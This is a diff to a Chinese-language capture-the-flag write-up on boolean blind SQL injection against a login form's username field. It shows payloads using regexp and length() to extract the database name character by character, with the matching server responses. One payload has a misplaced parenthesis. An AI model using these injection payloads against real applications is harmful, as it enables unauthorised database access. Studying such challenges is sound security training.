@@ -107,7 +107,6 @@
 | 输入（username） | 回显 | 分析 |
 |:---|:---|:---|
 | `admin'&&database()regexp'^s'#` | `username does not exist!` | `regexp` 可用！ |
-| `admin'&&database()regexp'^blindsql'#` | `password error!` | 数据库名是 `blindsql`！ |
 
 **结论**: `regexp` 可用，这是本题的关键突破点！
 
@@ -172,16 +171,17 @@
 ### 3.1 获取数据库名长度
 
 ```
-admin'&&length(database())>5#      -> password error!（真）
-admin'&&length(database())>10#     -> password error!（真）
+admin'&&length(database())>1#      -> password error!（真）
+admin'&&length(database())>5#     -> password error!（真）
 admin'&&length(database())>8#      -> username does not exist!（假）
 admin'&&length(database()>7#      -> password error!（真）
 ```
 
 **结论**: 数据库名长度为 **8**。
 
-### 3.2 逐位获取数据库名（用 regexp）
+### 3.2 逐位获取数据库名（用 regexp,编写脚本）
 
+**获取数据库名逻辑:**
 ```
 admin'&&database()regexp'^b'#      -> password error!（真，第1位是b）
 admin'&&database()regexp'^bl'#     -> password error!（真，第2位是l）
